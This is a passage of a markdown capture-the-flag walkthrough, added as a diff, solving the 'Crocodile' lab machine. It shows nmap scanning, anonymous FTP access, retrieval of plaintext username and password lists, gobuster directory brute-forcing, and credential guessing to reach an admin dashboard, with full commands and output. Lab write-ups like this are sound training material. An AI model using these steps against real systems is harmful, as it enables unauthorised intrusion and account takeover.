@@ -1713,3 +1713,242 @@ Using nmap, we were able to discover the host had a MYSQL database located on po
 
 [Table of Contents](#table-of-contents) 
 
+## Level 3: Crocodile
+
+### Scope
+
+The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:
+
+| # | 	Description 	| Value |
+| ----------- | ----------- | ----------- |
+| 1 | 	IP Address   |    	10.129.3.142 | 
+
+### Enumeration
+
+Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.
+
+First we can try to see if we can make contact with the machine with a ping request.
+
+```
+ping {ip address}
+```
+The results from the ping are:
+
+```
+└─$ ping 10.129.3.142
+
+PING 10.129.3.142 (10.129.3.142) 56(84) bytes of data.
+64 bytes from 10.129.3.142: icmp_seq=1 ttl=63 time=8.61 ms
+64 bytes from 10.129.3.142: icmp_seq=2 ttl=63 time=7.87 ms
+64 bytes from 10.129.3.142: icmp_seq=3 ttl=63 time=6.67 ms
+64 bytes from 10.129.3.142: icmp_seq=4 ttl=63 time=10.6 ms
+
+--- 10.129.3.142 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3006ms
+rtt min/avg/max/mdev = 6.674/8.444/10.629/1.437 ms
+
+```
+As we can see, we made a connection with the host. 
+
+Next, we can try using nmap to see if there are any ports that can be exploited.
+
+```
+nmap -p- --min-rate 3000 -sC -sV {ip address}
+```
+
+Where:
+
+```
+-p-: scans ALL ports
+--min-rate <number>: Send packets no slower than <number> per second
+-sC: equivalent to --script=default
+-sV: Probe open ports to determine service/version info
+```
+The results of nmap are:
+
+```
+└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.3.142
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 20:39 EDT
+Nmap scan report for 10.129.3.142
+Host is up (0.0063s latency).
+Not shown: 65533 closed tcp ports (conn-refusecdd)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.87
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Smash - Bootstrap Business Template
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds
+                                                                 
+
+```
+
+Our scan reveals two open to dissect; port 21 (a non encrypted FTP channel) and port 80 (Web Server)/ 
+
+The first thing we can try is browsing the FTP directory for clues.
+
+
+
+```
+└─$ ftp 10.129.3.142
+
+Connected to 10.129.3.142.
+220 (vsFTPd 3.0.3)
+
+Name (10.129.3.142:kali): 
+
+```
+We can first try to use the ```anonymous``` credential: 
+
+```
+Name (10.129.3.142:kali): anonymous
+
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> 
+
+```
+We were successful, now we can browse the current directory:
+
+```
+ftp> dir
+
+229 Entering Extended Passive Mode (|||48008|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+226 Directory send OK.
+```
+There are two files of interest here, ```allowed.userlist``` and ```allowed.userlist.passwd```
+
+We can first tranfer them using the get command, then view them using the cat command:
+
+```
+ftp> get allowed.userlist
+
+local: allowed.userlist remote: allowed.userlist
+229 Entering Extended Passive Mode (|||41722|)
+150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
+100% |*************************************************************************************|    33        8.99 KiB/s    00:00 ETA
+226 Transfer complete.
+33 bytes received in 00:00 (2.18 KiB/s)
+
+ftp> get allowed.userlist.passwd
+
+local: allowed.userlist.passwd remote: allowed.userlist.passwd
+229 Entering Extended Passive Mode (|||41197|)
+150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
+100% |*************************************************************************************|    62      179.66 KiB/s    00:00 ETA
+226 Transfer complete.
+62 bytes received in 00:00 (9.13 KiB/s)
+
+└─$ cat allowed.userlist
+
+aron
+pwnmeow
+egotisticalsw
+admin
+
+└─$ cat allowed.userlist.passwd
+
+root
+Supersecretpassword1
+@BaASD&9032123sADS
+rKXM59ESxesUFHAd
+
+```
+It appears we uncovered a list known usernames, along with their corresponding passwords. We can now move on and check the webserver, since we gathered everything we could from the ftp server.
+
+![Screenshot_2022-07-22_20_56_34](https://user-images.githubusercontent.com/59018247/180584238-1a3ef760-bb08-4d38-8668-f6825c3f1f37.png)
+
+The website appears to be fairly standard, however there does not visibly appear to be any login page on the front end. We can try using gobuster to find any hidden directories on the web server.
+
+```
+└─$ sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.129.3.142
+
+[sudo] password for kali: 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.3.142
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/07/22 21:01:11 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/assets               (Status: 301) [Size: 313] [--> http://10.129.3.142/assets/]
+/css                  (Status: 301) [Size: 310] [--> http://10.129.3.142/css/]   
+/dashboard            (Status: 301) [Size: 316] [--> http://10.129.3.142/dashboard/]
+/fonts                (Status: 301) [Size: 312] [--> http://10.129.3.142/fonts/]    
+/index.html           (Status: 200) [Size: 58565]                                   
+/js                   (Status: 301) [Size: 309] [--> http://10.129.3.142/js/]       
+/server-status        (Status: 403) [Size: 277]                                     
+                                                                                    
+===============================================================
+2022/07/22 21:01:15 Finished
+===============================================================
+
+```
+In scanning the directories, one page seems to be promising; ```/dashboard```"
+
+![Screenshot_2022-07-22_21_03_34](https://user-images.githubusercontent.com/59018247/180584449-a25f0523-85e0-4b1c-8d62-1ca25db0d191.png)
+
+Since we aquired a user name and password list from the ftp server, we can try running the combinations through to find a successful credential. If we recall earlier, the user/password list was as follows:
+
+| # | 	Username 	| Password |
+| ----------- | ----------- | ----------- |
+| 1 | 	aron   |    	root | 
+| 2 | 	pwnmeow   |    	Supersecretpassword1 | 
+| 3 | 	egotisticalsw   |    	@BaASD&9032123sADS | 
+| 4 | 	admin   |    	rKXM59ESxesUFHAd  | 
+
+In trying all of the options, the 4th option appears to be valid credentials!
+
+![Screenshot_2022-07-22_21_08_56](https://user-images.githubusercontent.com/59018247/180584615-fe75f0ba-e40d-477e-a34f-0cc83c41de3f.png)
+
+We have finally aquired our ninth flag inside the dashboard.
+
+## Conclusions - Level 3 Crocodile
+
+| # | 	Tools 	| Description |
+| ----------- | ----------- | ----------- |
+| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
+| 2 | 	gobuster   |    	Used to brute force directories, DNS subdomains, virtual host names, and amazon s3 buckets | 
+
+| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
+| ----------- | ----------- | ----------- | ----------- | ----------- | ----------- |
+| 1 | 	Default/Weak Credentials   |    	X |  |  |  |
+| 2 | 	Insecure FTP Server   |    	X |  |  |  |
+
+Using nmap, we were able to discover the host had an FTP server port 21, and a web server on port 80. We were then able to get a username and password list from the FTP server. Armed with that information, we then used gobuster to find the admin login page to finally crack the authenticated login.
+
+[Table of Contents](#table-of-contents) 
